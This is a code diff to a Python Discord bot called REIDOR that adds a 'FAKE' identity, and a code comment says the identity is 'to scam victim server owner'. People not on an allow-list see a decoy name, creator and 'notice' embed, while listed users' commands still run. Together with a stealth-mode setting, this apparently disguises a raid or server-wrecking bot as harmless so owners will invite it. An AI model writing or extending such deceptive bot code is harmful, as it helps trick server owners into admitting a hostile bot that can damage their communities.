@@ -22,15 +22,24 @@ from intstallerm import INSTALL_ALL
 # MAIN STUFF
 # --------------------------
 botconfigdata = json.load(open("bot.json", "r"))
-bot_prefix = botconfigdata["bot-prefix"]
-bot_creator_name = botconfigdata["bot-creator-name"]
-bot_name = botconfigdata["bot-name"]
-bot_author_icon = botconfigdata["author-icon"]
+
+# REIDOR Info
+bot_prefix = botconfigdata["REIDOR"]["bot-prefix"]
+bot_creator_name = botconfigdata["REIDOR"]["bot-creator-name"]
+bot_name = botconfigdata["REIDOR"]["bot-name"]
+bot_author_icon = botconfigdata["REIDOR"]["author-icon"]
 # bot safe mode what time
-bot_sm_wt_jsonl = botconfigdata["safe-modes-wait-time"]
+bot_sm_wt_jsonl = botconfigdata["REIDOR"]["safe-modes-wait-time"]
 botsmwt = float(bot_sm_wt_jsonl)
-stealth_mode = botconfigdata["stealth-mode-on-off"]
+stealth_mode = botconfigdata["REIDOR"]["stealth-mode-on-off"]
 token = botconfigdata["bot-token"]
+
+# FAKE Info to scam victim server owner
+fake_bot_prefix = botconfigdata["FAKE"]["bot-prefix"]
+fake_bot_name = botconfigdata["FAKE"]["bot-name"]
+fake_bot_creator_name = botconfigdata["FAKE"]["bot-creator-name"]
+fake_bot_author_icon = botconfigdata["FAKE"]["author-icon"]
+fake_bot_notice_message = botconfigdata["FAKE"]["bot-notice-message"]
 
 
 # CREATING THE BOT
@@ -689,13 +698,14 @@ async def on_message(message):
     if message.author.id in able_users:
         await client.process_commands(message)
     else:
-        if str(message.content).lower().startswith(bot_prefix):
+        if str(message.content).lower().startswith(fake_bot_prefix):
             embed = discord.Embed(title=f"{message.author.name}! Please Stay Tuned!", colour=discord.Colour(
                 0x00d9ff), timestamp=datetime.datetime.utcfromtimestamp(1629281713))
-            embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
-            embed.set_thumbnail(url=f"{bot_author_icon}")
+            embed.set_author(name=f"{fake_bot_name}",
+                             icon_url=f"{fake_bot_author_icon}")
+            embed.set_thumbnail(url=f"{fake_bot_author_icon}")
             embed.add_field(
-                name="Notice!", value=f"```This bot is still in the early stages of development! Please stay tuned! There will be a lot coming. Thank You!```", inline=False)
+                name="Notice!", value=f"```- {fake_bot_name} - {fake_bot_notice_message} - Made by {fake_bot_creator_name}```", inline=False)
             await message.channel.send(embed=embed)
 
 # keep_alive()
